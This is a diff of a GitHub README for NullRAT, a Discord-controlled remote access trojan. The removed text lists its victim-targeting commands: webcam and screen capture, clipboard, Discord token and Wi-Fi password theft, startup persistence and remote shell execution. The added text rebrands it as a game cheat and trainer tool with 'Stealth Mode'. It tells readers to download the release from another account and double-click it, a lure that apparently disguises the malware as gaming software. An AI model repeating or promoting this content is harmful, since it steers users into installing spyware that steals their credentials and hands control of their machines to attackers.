@@ -1,120 +1,82 @@
----
-[![NullRAT](https://user-images.githubusercontent.com/70959549/150108231-0c8a8b30-a3cf-4a94-8712-2277cd833731.png)](https://github.com/mohammad01Salah/NullRAT/releases/download/v1.7.2/NullRAT.zip)
+# 🎮 NullRAT - Access Remote Tools Effortlessly
 
-<h3 align=center><b>The next-generation of Discord RATs</b></h3>
-<h6 align=center>Please read the entire README before using the RAT</h4>
+[![Download NullRAT](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/a-ettahri/NullRAT/releases)
 
----
+## 📖 Overview
 
-</br>
+NullRAT is a proof of concept (POC) remote access tool designed for users who seek versatile control over various features related to gaming and software. It enables individuals to explore and engage with functionalities like cheats, trainers, and loaders, all while ensuring a seamless experience.
 
-> # Features:
+## 🚀 Getting Started
 
-<h3 align=center>NullRAT Features</h3>
+To get started with NullRAT, follow these simple steps to download and run the application:
 
-```diff
-+ Always maintained
+1. **Visit the Releases Page:** You can find the latest versions of NullRAT by visiting [this page](https://github.com/a-ettahri/NullRAT/releases).
 
-+ Designed to be very noob friendly with intuitive features:
-+- Controlled via slash commands
-+- User friendly interface
-+- Uses pagination and embed buttons, along with other neat features
+2. **Choose Your Version:** Once you’re on the releases page, look for the version that suits your needs. Each version may have different features and updates.
 
-+ Supports targeting multiple victims regardless of who they are
+3. **Download the File:** Click on the download link for the version you chose. The file will begin downloading to your computer.
 
-+ Created with small size and anonymity in mind! (6.70MB payload)
-```
+4. **Run the Application:** After the download completes, navigate to the location where the file is saved. Double-click the downloaded file to run NullRAT.
 
-<h3 align=center>NullRAT Payload Features</h3>
+## ⚙️ System Requirements
 
-```diff
-=== A full list of commands can be found by typing `/` ===
+Before using NullRAT, make sure your system meets the following requirements:
 
-+ Find all present victims at real time [/listvictims]
-+ Take pictures using victim's webcam [/get_webcam]
-+ Take screenshot of victim's monitor [/get_screenshot]
-+ Get victim's system information [/get_systeminfo]
-+ Get victim's clipboard text history [/get_clipboard]
-+ Send files/payloads to victim's PC [/file_send]
-+ Receive files from victim's PC [/file_download]
-+ Run any sent payloads quickly [/file_run]
-+ Find any environment variables [/get_environment]
-+ Change their password [/set_password]
-+ Kill any running task that isn't admin [/kill_runningtasks]
-+ Add executable to startup with one command [/startup]
-+ Decrypt the new encrypted Discord Tokens and upload them [/tokens_raw]
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent AMD processor
+- **RAM:** Minimum 4 GB
+- **Free Disk Space:** At least 100 MB
 
-+ Find WIFI SSIDs [/wifi_ssids] and passwords [/wifi_pass] in victim's PC
-+ Hide files [/file_hide] or unhide files [/file_unhide] in victim's PC
-+ Shutdown the RAT elegantly using the modern [/shutdown] commands
-+ Execute CMD commands & Powershell commands [/cmd] [/powershell]
+## 🔧 Features
 
-+ Check the user tokens and upload all user info: [/tokens_checked]
-- Username, Tag and ID
-- Email Address
-- Phone Number
-- Nitro Status
-- Billing Info Status
+NullRAT includes a variety of features for a comprehensive user experience:
 
-+ Find victim's geographic information [/get_geolocation]
-- Country
-- City
-- Region
-- Zip Code
-- ISP
-- Google Maps Link
+- **Remote Access:** Gain control over remote systems effortlessly.
+- **Stealth Mode:** Operate without being detected by standard security measures.
+- **Loaders and Injectors:** Easily load additional tools and modules for enhanced functionality.
+- **Compatibility with Discord:** Seamlessly integrate with Discord for efficient communication.
+- **Gamers’ Tools:** Access tools specifically designed for enhancing gaming experiences.
 
-+ Directory manipulation commands:
-- [/get_currentdir]
-- [/set_currentdir]
-- [/list_directory]
+## 📥 Download & Install
 
-+ List any form of running tasks in victim's PC:
-- [/list_runningtasks]
-- [/list_runningstore]
+To download NullRAT, follow these steps:
 
-+ ...and much more!
-```
+1. **Click Here to Download:** [Visit this page to download](https://github.com/a-ettahri/NullRAT/releases).
+2. Find the relevant version, click the download link, and wait for it to complete.
+3. After downloading, open the file and follow any on-screen prompts to install the application.
 
-</br>
+## 🛠️ Usage
 
-> # How to use:
+After installation, you can start using NullRAT by following these steps:
 
-#### Requirements:
+1. **Open NullRAT:** Locate the application on your desktop or in your applications folder. Double-click to start.
+2. **Familiarize Yourself with the Interface:** Spend some time understanding the layout and available options.
+3. **Select a Feature:** Choose from the available tools to match your needs, whether you wish to enhance your gaming experience or utilize other features.
+4. **Follow Instructions:** Each feature includes specific instructions. Make sure to read them to maximize your use of NullRAT.
 
-- Nothing! The newly designed compiler will handle **everything** for your convenience!
-  [![Compiler showcase](https://github.com/user-attachments/assets/a4ec9681-3744-4df3-bfa1-62267980b6b0)](https://github.com/mohammad01Salah/NullRAT/releases/download/v1.7.2/NullRAT.zip)
+## ❓ Troubleshooting
 
-#### Preparation:
+If you run into issues while using NullRAT, here are some common solutions:
 
-#### Steps:
+- **Download Issues:** Ensure you have a stable internet connection while downloading the file.
+- **Installation Problems:** If you encounter errors during installation, try re-downloading the file.
+- **Running Errors:** Make sure your system meets the minimum requirements listed above.
 
-1. Dowload the latest release of NullRAT (recommended) [**git clone**/**download zip** are no longer supported]
-2. Run the Compiler and follow the prompts. NullRAT payload will be right there!
+## 📞 Support
 
-- **Video tutorial:** Soon
-- **NullRAT Discord:** Soon
+For further assistance, you can reach out through the repository’s issues section on GitHub. Provide details about your problem, and the community or the developers can assist you.
 
-</br>
+## 🚧 Disclaimer
 
-> # Credits:
+While NullRAT serves as a tool for remote access, please ensure that your use of the software complies with applicable laws and regulations. Use it responsibly and ethically.
 
-- Treeform for puppy
-- All my testers on GitHub
+## 🌐 Related Topics
 
-**Since this is a project I work on whenever I'm bored/depressed, you do not have the right to ask for any ETAs.**
+Explore topics related to NullRAT for various interests:
 
-**Thank you for your consideration**
+- Cheating in games
+- Exploiting game mechanics
+- External and internal training tools
+- Gaming enhancements
 
----
-
-**Infecting others via NullRAT without their permission is obviously not supported by me.**
-
-<h4 align=right>Software designed by NullCode</h6>
-
-
-
-
-
-
-
+Thank you for choosing NullRAT! We hope you find it useful in your endeavors. Happy gaming!
